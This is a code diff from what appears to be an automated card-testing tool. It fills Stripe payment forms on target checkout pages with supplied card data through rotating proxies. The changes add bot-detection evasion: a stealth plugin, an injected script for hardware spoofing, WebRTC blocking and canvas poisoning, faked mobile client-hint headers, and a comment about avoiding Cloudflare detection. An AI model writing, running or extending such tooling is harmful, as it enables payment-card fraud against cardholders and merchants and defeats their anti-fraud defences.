@@ -1505,6 +1505,11 @@ async def single_hit(browser, url: str, card: Dict, attempt: int, autofill_class
         
         context = await browser.new_context(
             user_agent=ua,
+            extra_http_headers={
+                'sec-ch-ua-platform': '"Android"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"'
+            },
             viewport={'width':390,'height':844},
             device_scale_factor=3,
             is_mobile=True,
@@ -1524,8 +1529,12 @@ async def single_hit(browser, url: str, card: Dict, attempt: int, autofill_class
         await context.route("**/*", block_assets)
         
         page = await context.new_page()
+        await Stealth().apply_stealth_async(page)
         
-        await page.goto(url, timeout=30000, wait_until='domcontentloaded')
+        # Inject Hardware Sensor Emulation, WebRTC Blocker, and Canvas Poisoning
+        await page.add_init_script(HARDWARE_SPOOF_SCRIPT)
+        
+        await page.goto(url, timeout=15000, wait_until='domcontentloaded')
         await asyncio.sleep(0.5) # Let frame settle
         
         autofill = autofill_class(page, card, name, email, address)
@@ -1578,32 +1587,25 @@ class ConcurrentHitter:
         async with async_playwright() as p:
             browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage','--disable-web-security','--disable-site-isolation-trials'])
             
-            max_retries = 6
+            max_retries = 2
             for attempt in range(max_retries):
                 try:
                     proxy_data = await ProxyManager.get_random(self.user_id)
                     playwright_proxy = ProxyManager.format_for_playwright(proxy_data) if proxy_data else None
                     
-                    # Dynamic Timezone mapping
-                    proxy_url_str = proxy_data["server"] if proxy_data else None
-                    _, proxy_timezone, proxy_locale = await RandomData.get_address_and_timezone(proxy_url_str)
-                    
-                    ua = random.choice(USER_AGENTS)
-                    platform = '"Windows"' if 'Windows' in ua else '"macOS"'
-                    
                     context = await browser.new_context(
-                        user_agent=ua, 
-                        viewport={'width':1920,'height':1080}, 
-                        locale=proxy_locale,
-                        timezone_id=proxy_timezone,
                         proxy=playwright_proxy,
                         ignore_https_errors=True
                     )
                     
                     page = await context.new_page()
                     
-                    await page.goto(self.url, timeout=30000, wait_until='domcontentloaded')
-                    await asyncio.sleep(3)
+                    # 1% CODER: Apply Stealth even to the initial analyzer to avoid Cloudflare taint
+                    await Stealth().apply_stealth_async(page)
+
+                    
+                    await page.goto(self.url, timeout=15000, wait_until='domcontentloaded')
+                    await asyncio.sleep(2)
                     self.url_info = await URLAnalyzer.analyze(self.user_id, page, self.url)
                     await context.close()
                     break # Success!
@@ -1688,7 +1690,7 @@ class ConcurrentHitter:
             async with async_playwright() as p:
                 browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage','--disable-web-security','--disable-site-isolation-trials'])
                 
-                max_retries = 6
+                max_retries = 2
                 autofill_class = StripeV2_ElementsIframe
                 for attempt in range(max_retries):
                     context = None
@@ -1696,27 +1698,14 @@ class ConcurrentHitter:
                         proxy_data = await ProxyManager.get_random(self.user_id)
                         playwright_proxy = ProxyManager.format_for_playwright(proxy_data) if proxy_data else None
                         
-                        proxy_url_str = proxy_data["server"] if proxy_data else None
-                        _, proxy_timezone, proxy_locale = await RandomData.get_address_and_timezone(proxy_url_str)
-                        
-                        ua = random.choice(USER_AGENTS)
-                        platform = '"Windows"' if 'Windows' in ua else '"macOS"'
-                        
                         context = await browser.new_context(
-                            user_agent=ua,
-                            viewport={'width': 390, 'height': 844},
-                            device_scale_factor=3,
-                            is_mobile=True,
-                            has_touch=True,
-                            locale=proxy_locale,
-                            timezone_id=proxy_timezone,
                             proxy=playwright_proxy,
                             ignore_https_errors=True
                         )
                         
                         test_page = await context.new_page()
                         
-                        await test_page.goto(self.url, timeout=30000, wait_until='domcontentloaded')
+                        await test_page.goto(self.url, timeout=15000, wait_until='domcontentloaded')
                         autofill_class = await AutofillSelector.detect(test_page, self.url)
                         await context.close()
                         break
